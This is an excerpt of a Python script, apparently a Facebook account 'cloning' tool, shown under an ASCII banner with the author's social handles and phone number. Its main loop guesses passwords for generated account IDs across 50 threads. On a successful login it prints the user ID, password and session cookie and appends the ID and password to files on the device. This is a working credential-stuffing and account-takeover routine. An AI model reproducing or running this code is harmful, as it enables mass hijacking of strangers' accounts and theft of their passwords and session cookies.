...
| |   / ____ \   | || |   '.___`-.   | || |      | |     | || |   |  __'.    | |  
| | _/ /    \ \_ | || |  |`\____) |  | || |     _| |_    | || |  _| |  \ \_  | |  
| ||____|  |____|| || |  |_______.'  | || |    |_____|   | || | |____||____| | |  
| |              | || |              | || |              | || |              | |  
| '--------------' || '--------------' || '--------------' || '--------------' |  
 '----------------'  '----------------'  '----------------'  '----------------'   

\033[0;93m╠══[Author:=======================> \33[1;38mAR  ASIK\33[1;38m        ║\033[1;31m
╠══[Facebook:=====================> ASIK King       ║  \033[1;97m
╠══[Github:=======================> \33[1;38mASIK-King       ║\33[1;34m
╠══[Whatsapp:=====================> 01322738651     ║\33[1;35m
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mAsik Super Fast Speed Cloning')
        jalan('\033[1;97m====================================================')
        for love in user:
            pwx = [love[1:]]
            uid = code+love
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[ASIK-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/ASIK-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/ASIK-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}ASIK{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
